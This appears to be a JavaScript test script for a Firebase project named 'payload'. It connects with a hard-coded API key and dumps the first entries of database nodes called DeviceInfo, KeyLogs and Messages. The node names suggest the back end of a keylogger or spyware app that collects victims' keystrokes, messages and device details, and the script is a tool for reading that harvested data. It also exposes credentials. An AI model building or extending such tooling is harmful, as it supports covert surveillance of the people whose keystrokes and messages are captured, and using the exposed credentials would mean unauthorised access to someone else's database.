// Simple test to verify Firebase connection and see actual data
import { initializeApp } from "firebase/app";
import { getDatabase, ref, get } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyDAXJOpQaY6auUc9xBV3EwWeMaqG4FJ9Xk",
  authDomain: "payload-fea30.firebaseapp.com",
  databaseURL: "https://payload-fea30-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "payload-fea30",
  storageBucket: "payload-fea30.firebasestorage.app",
  messagingSenderId: "548911851830",
  appId: "1:548911851830:web:db0eb8754598876037eb97"
};

const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

async function testConnection() {
  try {
    console.log('🔍 Testing Firebase connection...');
    
    // Test 1: Check if we can connect
    const rootSnapshot = await get(ref(database, '/'));
    console.log('✅ Connection successful!');
    
    // Test 2: Check DeviceInfo structure
    console.log('\n📱 Checking DeviceInfo...');
    const deviceInfoSnapshot = await get(ref(database, 'DeviceInfo'));
    const deviceInfo = deviceInfoSnapshot.val();
    if (deviceInfo) {
      console.log('DeviceInfo keys:', Object.keys(deviceInfo));
      // Show first device details
      const firstDeviceKey = Object.keys(deviceInfo)[0];
      console.log('First device details:', deviceInfo[firstDeviceKey]);
    } else {
      console.log('❌ No DeviceInfo found');
    }
    
    // Test 3: Check KeyLogs structure
    console.log('\n⌨️ Checking KeyLogs...');
    const keyLogsSnapshot = await get(ref(database, 'KeyLogs'));
    const keyLogs = keyLogsSnapshot.val();
    if (keyLogs) {
      console.log('KeyLogs keys:', Object.keys(keyLogs));
      // Show first device's key logs
      const firstDeviceKey = Object.keys(keyLogs)[0];
      if (keyLogs[firstDeviceKey]) {
        console.log('First device key logs keys:', Object.keys(keyLogs[firstDeviceKey]));
        const firstLogKey = Object.keys(keyLogs[firstDeviceKey])[0];
        if (firstLogKey) {
          console.log('First log details:', keyLogs[firstDeviceKey][firstLogKey]);
        }
      }
    } else {
      console.log('❌ No KeyLogs found');
    }
    
    // Test 4: Check Messages structure
    console.log('\n💬 Checking Messages...');
    const messagesSnapshot = await get(ref(database, 'Messages'));
    const messages = messagesSnapshot.val();
    if (messages) {
      console.log('Messages keys:', Object.keys(messages));
    } else {
      console.log('❌ No Messages found');
    }
    
    console.log('\n✅ Test complete!');
    
  } catch (error) {
    console.error('❌ Test failed:', error);
  }
}

// Run the test
testConnection();
